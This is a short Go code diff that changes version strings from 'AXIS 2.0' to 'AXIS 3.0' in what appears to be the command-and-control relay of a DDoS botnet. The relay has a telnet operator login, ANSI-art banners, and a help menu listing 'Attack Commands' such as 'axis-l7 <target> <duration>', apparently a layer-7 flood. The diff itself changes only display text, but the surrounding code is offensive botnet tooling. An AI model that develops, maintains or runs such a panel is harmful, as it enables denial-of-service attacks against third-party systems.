@@ -10,7 +10,7 @@ import (
 )
 
 /*
- * AXIS 2.0 P2P Relay Server
+ * AXIS 3.0 P2P Relay Server
  * Telnet interface for sending commands through P2P network
  */
 
@@ -21,7 +21,7 @@ type RelayUser struct {
 }
 
 func main() {
-	fmt.Printf("AXIS 2.0 P2P Relay Server\n")
+	fmt.Printf("AXIS 3.0 P2P Relay Server\n")
 	fmt.Printf("=========================\n\n")
 	fmt.Printf("Listening on %s\n", RelayListenAddr)
 	fmt.Printf("Seed peers: %v\n\n", seedPeers)
@@ -51,7 +51,7 @@ func handleUser(conn net.Conn) {
 	conn.Write([]byte("\x1b[1;34m   ╔═╗═╗ ╦╦╔═╗\r\n"))
 	conn.Write([]byte("\x1b[1;36m   ╠═╣╔╩╦╝║╚═╗\r\n"))
 	conn.Write([]byte("\x1b[1;94m   ╩ ╩╩ ╚═╩╚═╝\r\n"))
-	conn.Write([]byte("\x1b[1;34m  AXIS 2.0 P2P Relay\r\n"))
+	conn.Write([]byte("\x1b[1;34m  AXIS 3.0 P2P Relay\r\n"))
 	conn.Write([]byte("\x1b[1;36m  Enter credentials\r\n"))
 	conn.Write([]byte("\x1b[1;94mUsername\x1b[1;36m: \x1b[0m"))
 
@@ -136,7 +136,7 @@ func showHelp(user *RelayUser) {
 	conn := user.conn
 	conn.Write([]byte("\r\n"))
 	conn.Write([]byte("\x1b[1;34m╔══════════════════════════════════════════╗\r\n"))
-	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAXIS 2.0 P2P Relay Commands\x1b[1;34m            ║\r\n"))
+	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAXIS 3.0 P2P Relay Commands\x1b[1;34m            ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
 	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAttack Commands:\x1b[1;34m                         ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 <target> <duration>\x1b[1;34m            ║\r\n"))
